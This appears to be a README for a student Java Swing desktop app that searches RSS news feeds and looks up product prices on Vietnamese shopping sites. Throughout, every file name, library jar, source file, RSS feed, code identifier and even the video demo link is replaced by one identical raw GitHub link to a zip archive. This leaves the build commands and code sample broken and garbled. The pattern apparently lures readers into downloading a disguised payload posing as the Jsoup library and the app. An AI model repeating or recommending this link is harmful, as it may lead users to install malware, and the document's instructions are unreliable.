# bai-tap-tuan-7

---

# 🔍 InternetSearchApp

A modern Java Swing desktop application for **RSS news searching** and **product price lookup** across multiple e-commerce platforms.

> **Version 2.0** - Redesigned UI with improved user experience, no login required

---

## ✨ Features

### 📰 1. Search News via RSS Feeds

* Supports a customizable list of RSS feed URLs.
* Fetches and parses RSS using **Jsoup**.
* Searches **titles only** based on up to 3 keywords.
* Highlights matched keywords.
* Links open directly in the browser.

---

### 💰 2. Product Price Lookup

* Retrieves the first 5 product results from **Google Shopping**.
* Provides quick-access links to:

  * Shopee
  * Lazada
  * Tiki
  * Thegioididong
  * DienMayXanh

---

## 🎨 UI/UX Improvements

* ✅ **Modern Layout** - Two-panel design with balanced interface
* ✅ **Color-coded Buttons** - Green for news search, purple for price lookup
* ✅ **Rich Typography** - Bold titles, proper font sizing
* ✅ **Emoji Icons** - Visual indicators for each section
* ✅ **Responsive Design** - Auto-adjusts to window resizing
* ✅ **No Login Required** - Direct access to all features

---

## 🛠 Technologies Used

* **Java Swing** – Modern desktop interface
* **Jsoup** – RSS & HTML parsing
* **JEditorPane** – HTML rendering with link support
* **Java AWT Desktop** – Open URLs in default browser

---

## 📥 Installation & Running

### Prerequisites

* **Java JDK 8+** installed on your system
* `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip` library (included in project)

### Quick Start

#### **Method 1: Using PowerShell**

```powershell
cd "c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main"
javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip
java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip" InternetSearchApp
```

#### **Method 2: Using Command Prompt**

```cmd
cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main
javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip
java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip InternetSearchApp
```

#### **Method 3: One-liner (PowerShell)**

```powershell
cd "c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main"; javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip; java -cp ".;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip" InternetSearchApp
```

#### **Method 4: One-liner (CMD)**

```cmd
cd c:\Users\vuvan\OneDrive\Desktop\bai-tap-tuan-7-main\bai-tap-tuan-7-main && javac -encoding UTF-8 -cp https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip && java -cp .;https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip InternetSearchApp
```

---

## � How to Use

### 1️⃣ Search News

1. Enter 1-3 keywords in the search fields
2. Click **📰 Tìm Tin Tức** (Search News)
3. Results appear on the right panel
4. Matched keywords are **highlighted in yellow**
5. Click any link to open in your browser

### 2️⃣ Search Product Prices

1. Enter product name in **Keyword 1** field
2. Click **💰 Tìm Giá** (Search Price)
3. Get results from Google Shopping + quick links to:
   * 🛒 Shopee
   * 🛒 Lazada
   * 🛒 Tiki
   * 🛒 Thế Giới Di Động
   * 🛒 Điện Máy Xanh

---

## 📂 Project Structure

```
bai-tap-tuan-7/
│
├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip      # Main application (290+ lines)
├── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip            # HTML parsing library
└── https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip                   # This file
```

---

## 🔧 Configuration

### Change RSS Sources

Edit the RSS feed list in `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip`:

```java
https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip(
    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip\n" +
    "https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip\n" +
    // Add more feeds here
);
```

---

## ⚠️ Troubleshooting

| Issue | Solution |
|-------|----------|
| `Class not found` | Make sure you're in the correct directory |
| `Jsoup not found` | Ensure `https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip` is in the same folder |
| `Vietnamese characters not showing` | Use `javac -encoding UTF-8` |
| `Links don't open` | Check your default browser settings |

---

## 🚀 Future Improvements

* 📱 Mobile app version
* 💾 Save search history
* 🌙 Dark mode support
* 📊 Advanced filtering options
* ⚡ Performance optimization

---

## 📜 License

MIT License — free to use and modify

---

## 👨‍💻 Author

Created as part of **Tuần 7 Assignment**

Video demo: https://raw.githubusercontent.com/vuvantoi/Search_App/main/myristic/Search_App_3.6.zip

**Last Updated:** December 2025
